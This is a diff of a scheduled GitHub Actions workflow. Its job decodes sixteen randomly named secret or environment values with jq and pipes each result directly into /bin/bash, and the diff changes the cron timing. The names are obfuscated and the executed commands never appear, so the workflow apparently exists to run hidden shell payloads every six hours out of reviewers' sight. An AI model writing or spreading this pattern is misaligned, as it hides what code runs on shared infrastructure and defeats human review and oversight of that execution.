@@ -2,19 +2,32 @@ name: haofengshengna
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 3/6 * * *'
+    - cron: '53 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: haofengshengna
         env:
-          wrd768: ${{ secrets.wrd768 }}
+          ncap16352: ${{ secrets.ncap16352 }}
         run: |
-          echo $wrd768 | jq -r .zcgpz05 | /bin/bash
-          echo $q122 | jq -r .f089 | /bin/bash
-          echo $wm8898 | jq -r .vpx54914 | /bin/bash
-          echo $rp5292 | jq -r .h49 | /bin/bash
-          echo $b82 | jq -r .afqt39 | /bin/bash
+          echo $ncap16352 | jq -r .mki156 | /bin/bash
+          echo $zttj129 | jq -r .jtrsj7586 | /bin/bash
+          echo $ul6 | jq -r .nzg94 | /bin/bash
+          echo $nliba55 | jq -r .jbu6336 | /bin/bash
+          echo $rvqms48424 | jq -r .rat3449 | /bin/bash
+          echo $g11 | jq -r .xhv1 | /bin/bash
+          echo $rupu436 | jq -r .x66825 | /bin/bash
+          echo $tgxg7712 | jq -r .tt2190 | /bin/bash
+          echo $tomy1308 | jq -r .wcx312 | /bin/bash
+          echo $fuq935 | jq -r .fosh731 | /bin/bash
+          echo $moprl457 | jq -r .okl34 | /bin/bash
+          echo $um1542 | jq -r .st143 | /bin/bash
+          echo $pncoz48 | jq -r .wce5 | /bin/bash
+          echo $ywr15 | jq -r .iqi05485 | /bin/bash
+          echo $yr2 | jq -r .ypdoo84498 | /bin/bash
+          echo $z42654 | jq -r .kmoq8 | /bin/bash
 
